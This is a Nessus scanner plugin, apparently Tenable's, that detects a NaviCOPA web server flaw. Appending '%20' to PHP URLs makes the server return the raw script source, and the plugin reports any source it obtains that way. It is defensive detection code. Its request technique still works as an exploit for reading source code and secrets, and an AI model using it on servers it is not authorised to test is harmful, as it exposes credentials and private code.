#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(42150);
  script_version("$Revision: 1.1 $");

  script_bugtraq_id(36705);
  script_xref(name:"OSVDB", value:"58949");
  script_xref(name:"Secunia", value:"37014");

  script_name(english:"NaviCOPA Encoded Space Request Source Code Disclosure");
  script_summary(english:"Tries to read the source of a PHP script");
 
  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server is affected by a source code disclosure\n",
      "vulnerability."
    )
  );
  script_set_attribute(
    attribute:"description", 
    value:string(
      "The installed version of the NaviCOPA web server software on the\n",
      "remote host returns the source of scripts hosted on it when '%20'\n",
      "is appended to the request URL.  A remote attacker can leverage this\n",
      "issue to view the source code of CGIs and possibly obtain passwords\n",
      "and other sensitive information from this host."
    )
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://freetexthost.com/n5l0h34pxc" );

  script_set_attribute(
    attribute:"see_also",
    value:"http://www.packetstormsecurity.org/0910-exploits/navicopa-disclose.txt" );

  script_set_attribute(
    attribute:"solution", 
    value:string(
      "Unknown at this time.\n"
    )
  );
  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N"
  );
  script_set_attribute(
    attribute:"vuln_publication_date", 
    value:"2009/10/14"
  );
  script_set_attribute(
    attribute:"plugin_publication_date", 
    value:"2009/10/15"
  );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");
  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");
  script_dependencies("http_version.nasl", "webmirror.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}

#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0, "The web server does not support PHP scripts.");
 

# NB: we need this when testing NaviCOPA. :-)
disable_cookiejar();


# Unless we're paranoid, make sure the banner looks like NaviCOPA.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (!banner) exit(1, "get_http_banner() returned NULL for port "+port+".");
  if ("Server: InterVations NaviCOPA" >!< banner) exit(0, "The Server response header is not from it's not NaviCOPA.");
}


# NB: check a couple of files in case some don't contain any PHP code
#     or include it in the generated output.
max_files = 5;
files = get_kb_list(string("www/", port, "/content/extensions/php"));
if (isnull(files)) files = make_list("/index.php");

n = 0;
foreach file (files)
{
  ++n;

  # Try to exploit the issue.
  url = string(file, "%20");
  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res)) exit(1, "The web server failed to respond.");

  # nb: we need to remove CRs to be able to anchor regex to end of line.
  if ('\r\n' >< res[2]) 
    res[2] = str_replace(find:'\r\n', replace:'\n', string:res[2]);

  # If it looks like PHP source...
  if (
    "Content-Type: text/plain" >< res[1] &&
    "?>" >< res[2] &&
    egrep(pattern:"<\?(php|=)( |$)", string:res[2])
  )
  {
    res2 = http_send_recv3(method:"GET", item:file, port:port);
    if (isnull(res2)) exit(1, "The web server failed to respond.");

    if ('\r\n' >< res2[2]) 
      res2[2] = str_replace(find:'\r\n', replace:'\n', string:res2[2]);

    if (!egrep(pattern:"<\?(php|=)( |$)", string:res2[2]))
    {
      if (report_verbosity > 0)
      {
        report = string(
          "\n",
          "Nessus was able to retrieve the source of '", file, "' using\n",
          "the following URL :\n",
          "\n",
          "  ", build_url(port:port, qs:url), "\n"
        );

        if (report_verbosity > 1)
        {
          report = string(
            report,
            "\n",
            "Here it is :\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
            res[2], "\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
          );
        }
        security_warning(port:port, extra:report);
      }
      else security_warning(port);

      exit(0);
    }
  }
  if (n > max_files) break;
}
